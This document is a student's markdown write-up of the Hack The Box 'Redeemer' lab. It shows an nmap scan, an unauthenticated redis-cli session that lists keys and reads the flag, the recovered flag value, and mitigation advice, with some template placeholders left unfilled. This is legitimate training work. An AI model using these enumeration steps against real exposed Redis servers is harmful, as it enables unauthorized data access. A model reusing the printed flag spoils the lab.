# Cybersecurity L4 [PR3] - Redeemer

| | |
|---|---|
| **Machine** | Redeemer (HTB Starting Point, Tier 0) |
| **Tier** | 🔴 Hard (Task 3) |
| **OS** | Linux (Ubuntu, kernel 5.4.0-77-generic) |
| **Target IP** | `10.129.150.3` |
| **HTB username** | architmishra15 |
| **Service exploited** | Redis 5.0.7 (unauthenticated, port 6379) |
| **Date** | 31 October 2026 |

> **Prior Level 4 submissions:** _<list your earlier merged L4 PRs here, e.g. Meow, Dancing>_

---

## 1. Summary

Redeemer exposes a Redis key-value database to the network with **no authentication**. Anyone who can reach port 6379 can connect, dump the keyspace and read every stored value. The flag is stored as a plain Redis key named `flag`.

---

## 2. Reconnaissance: Nmap

Command used:

```bash
nmap -sC -sV -p- 10.129.150.3
```

Full scan output:

```
<PASTE YOUR FULL NMAP OUTPUT HERE>
```

**Key finding:** TCP port **6379** is open and runs Redis. A default Nmap scan only covers the top 1000 ports, so Redis on 6379 would be missed without the `-p-` option.

---

## 3. Enumeration and exploitation: step by step

### Step 1: Connect to Redis with no credentials

```bash
redis-cli -h 10.129.150.3
```

The connection succeeded with no password prompt, so authentication is not enabled.

### Step 2: Fingerprint the server with `info`

```
10.129.150.3:6379> info
```

Relevant details from the output:

| Field | Value |
|---|---|
| `redis_version` | 5.0.7 |
| `redis_mode` | standalone |
| `os` | Linux 5.4.0-77-generic x86_64 |
| `tcp_port` | 6379 |
| `config_file` | /etc/redis/redis.conf |
| `connected_clients` | 1 |
| `role` | master |
| `cluster_enabled` | 0 |
| **Keyspace** | `db0:keys=4,expires=0,avg_ttl=0` |

The Keyspace section shows that database 0 holds **4 keys**, which is where to look next.

### Step 3: Select the database

```
10.129.150.3:6379> select 0
OK
```

### Step 4: List all keys

```
10.129.150.3:6379> keys *
1) "flag"
2) "numb"
3) "temp"
4) "stor"
```

Four keys came back, matching the `keys=4` count from `info`. One of them is called `flag`.

### Step 5: Read the flag

```
10.129.150.3:6379> get flag
"03e1d2b376c37ab3f5319922053953eb"
```

---

## 4. Recovered flag

```
03e1d2b376c37ab3f5319922053953eb
```

The flag was accepted on HTB (Root flag owned).

---

## 5. Screenshots

**Active HTB session / target IP:**

![HTB session and target IP](./screenshots/session.png)

**Flag submission, Redeemer solved:**

![Redeemer solved](./screenshots/solved.png)

_Place both images in a `screenshots/` folder next to this file, or update the paths._

---

## 6. Takeaways and mitigation

- **Root cause:** Redis was reachable from the network with no authentication.
- **Fixes:**
  - Set a strong `requirepass`, or use ACLs on Redis 6 and later.
  - Bind to `127.0.0.1` or a private interface only (`bind` in `redis.conf`).
  - Firewall port 6379 and keep `protected-mode yes`.
  - Never store secrets in plain keys.
- **Workflow learned:** full port scan, then connect, `info`, `select`, `keys *`, `get`. This applies to any exposed key-value service.

---

## 7. Proof
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/88161dcb-3ed2-40de-8007-462665b56530" />
